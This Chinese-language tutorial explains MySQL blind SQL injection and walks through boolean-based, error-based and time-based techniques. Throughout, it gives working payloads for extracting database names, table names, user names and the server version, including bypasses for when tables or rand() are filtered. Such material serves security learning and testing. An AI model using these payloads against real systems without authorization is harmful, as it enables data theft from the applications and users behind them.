# SQL盲注基础知识
## 基于布尔SQL盲注----------构造逻辑判断
**Sql注入截取字符串常用函数**

三大法宝：mid(),substr(),left()

**mid()函数**

此函数为截取字符串一部分。MID(column_name,start[,length])  
column_name：必需。要提取字符的字段。  
start：必需。规定开始位置（起始值是 1）。  
length：可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。  
Eg:      str="123456"     mid(str,2,1)    结果为2  
Sql用例：  
>（1）MID(DATABASE(),1,1)>’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。  
>（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。  

 **substr()函数**  
   Substr()和substring()函数实现的功能是一样的，均为截取字符串。  
   + string substring(string, start, length)
   + string substr(string, start, length)

参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。  
Sql用例：  
>(1) substr(DATABASE(),1,1)>’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。  
>(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。  

**Left()函数**
Left()得到字符串左部指定个数的字符  
Left ( string, n )        string为要截取的字符串，n为长度。  
Sql用例：  

>(1) left(database(),1)>’a’,查看数据库名第一位，left(database(),2)>’ab’,查看数据库名前二位。  
>(2) 同样的string可以为自行构造的sql语句。

同时也要介绍 **ORD()** 函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。
例如ORD(MID(DATABASE(),1,1))>114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’
类似的还有**ascii()函数**：  
`ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ `   
//substr()函数，ascii()函数  
Explain：substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值  
**▲ascii(substr((select database()),1,1))=98**  
**▲regexp正则注入**  

正则注入介绍：http://www.cnblogs.com/lcamry/articles/5717442.html  
用法介绍：select user() regexp '^[a-z]';  
Explain：正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。  
第二位可以用`select user() regexp '^ro'`来进行。  

当正确的时候显示结果为1，不正确的时候显示结果为0.  
示例介绍：  
>select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));  
>select * from users where id=1 and 1=(user() regexp'^ri');

通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。  
`select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);`

这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可  
`'^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' -> '^user[a-z]' -> FALSE`

如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table_name regexp '^username$'来进行判断。^是从开头进行匹配，$是从结尾开始判断。更多的语法可以参考mysql使用手册进行了解。  
好，这里思考一个问题，table_name有好几个，我们只得到了一个user，如何知道其他的？  
这里可能会有人认为使用limit 0，1改为limit 1,1。  
但是这种做法是错误的，limit作用在前面的select语句中，而不是regexp。那我们该如何选择。其实在regexp中我们是取匹配table_name中的内容，只要table_name中有的内容，我们用regexp都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。即，table_name中包含了所有的表名，除了匹配到user表之外，还可以继续匹配其他表，只需更改匹配规则即可。

**▲like匹配注入**  
和上述的正则类似，mysql在匹配的时候我们可以用ike进行匹配。  
用法：select user() like ‘ro%’  

## 基于报错的SQL盲注------构造payload让信息通过错误提示回显出来
**▲floor  rand  group by**  
`Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  `   

//explain:此处有三个点，一是需要concat计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。  
以上语句可以简化成如下的形式。    
`select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))`

如果关键的表被禁用了，可以使用这种形式  
`select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))`  

如果rand被禁用了可以使用用户变量来报错  
`select min(@a:=1) from information_schema.tables group by concat(user(),@a:=(@a+1)%2)`

用户变量：以"@"开始，形式为"@变量名"。用户变量跟mysql客户端是绑定的，设置的变量，只对当前用户使用的客户端生效

```
mysql> SELECT @t1:=(@t2:=1)+@t3:=4,@t1,@t2,@t3;
+----------------------+------+------+------+
| @t1:=(@t2:=1)+@t3:=4 | @t1  | @t2  | @t3  |
+----------------------+------+------+------+
|                    5 | 5    | 1    | 4    |
+----------------------+------+------+------+
```

解释：@t2:=1 给t2赋值为1，@t3:=4 给t3赋值为4，两这个相加后赋值给t1.  
▲select exp(~(select * FROM(SELECT USER())a))         //double数值类型超出范围  
 //Exp()为以e为底的对数函数；版本在5.5.5及其以上  
可以参考exp报错文章：http://www.cnblogs.com/lcamry/articles/5509124.html  

▲select !(select * from (select user())x) -（ps:这是减号） ~0  
//bigint超出范围；~0是对0逐位取反，很大的版本在5.5.5及其以上  
可以参考文章bigint溢出文章http://www.cnblogs.com/lcamry/articles/5509112.html  

▲extractvalue(1,concat(0x7e,(select @@version),0x7e))  se//mysql对xml数据进行查询和修改的xpath函数，xpath语法错误  
**ExtractValue(xml_str , Xpath)** 函数,使用Xpath表示法从XML格式的字符串中提取一个值  
**ExtractValue()**  函数中任意一个参数为NULL,返回值都是NULL.  
如果我们构造了不符合规定的Xpath,MySQL就会报语法错误,并显示XPath的内容.  
报错会从遇到的第一个特殊字符处开始报错.直到结束.但是报错的长度是有限制的.  

MariaDB [information_schema]> select extractvalue(1,concat(0x7e,(select @@version),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '\~10.1.9-MariaDB\~'

**▲updatexml(1,concat(0x7e,(select @@version),0x7e),1)**   //mysql对xml数据进行查询和修改的xpath函数，xpath语法错误  
**▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;**  
//mysql重复特性，此处重复了version，所以报错。  
好像只有version()函数才可以使用，其他如user()等会报不正确的参数错误，函数不能执行。  
>NAME_CONST(name,value)  
Returns the given value. When used to produce a result set column, NAME_CONST() causes the column to have the given name. The arguments should be constants.
```
mysql> SELECT NAME_CONST('myname', 14);
+--------+
| myname |
+--------+
|     14 |
+--------+ 
```

## 基于时间的SQL盲注----------延时注入  
**▲If(ascii(substr(database(),1,1))>115,0,sleep(5))%23**           //if判断语句，条件为假，执行sleep  
**▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;**   

//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()

本文参考SQL注入天书系列文章。
